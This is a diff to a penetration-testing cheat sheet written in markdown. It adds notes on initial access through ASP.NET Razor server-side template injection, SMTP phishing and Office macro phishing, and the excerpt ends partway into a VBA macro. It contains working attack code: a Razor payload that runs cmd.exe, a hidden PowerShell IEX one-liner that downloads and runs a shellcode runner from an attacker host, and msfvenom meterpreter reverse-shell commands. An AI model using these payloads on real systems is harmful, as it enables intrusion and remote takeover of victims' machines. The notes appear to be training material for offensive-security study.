@@ -43,13 +43,37 @@ msfvenom -p windows/meterpreter/reverse_tcp lhost=<kali ip> lport=443 prpendmigr
 msf6 (exploit/multi/handler) > set AutoRunScript post/windows/manage/migrate
 ```
 
-## Email Phishing Vector
+## Initial Access
+
+### Web SSTI Vulnerability
+- if SSTI vulnerable, read this for more info (https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-(SSTI)-in-ASP.NET-Razor/)
+- test for command execution with
+```csharp
+@{ 
+  var psi = new System.Diagnostics.ProcessStartInfo("cmd.exe", "/c whoami");
+  psi.RedirectStandardOutput = true;
+  psi.UseShellExecute = false;
+  var proc = System.Diagnostics.Process.Start(psi);
+  var output = proc.StandardOutput.ReadToEnd();
+}
+@output
+```
+if the above works then powershell shellcode runner
+```csharp
+@{ System.Diagnostics.Process.Start("cmd.exe", "/c powershell -w hidden -nop -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.XX.XX/simplerunner64.txt')"); }
+```
+
+### SQL Vulnerability
+
+
+
+### Email Phishing Vector
 - Look out for hosts with smtp (Port 25 default) and see if there are any email addresses found
 - Use smtp-user-enum if unable to find email addresses
 - send email with swaks
 
 
-## MSDoc Phishing
+### MSDoc Phishing
 - if .doc related, start off with a simple ping payload to check connectivity and command execution
 ```vba
 Sub MyMacro()
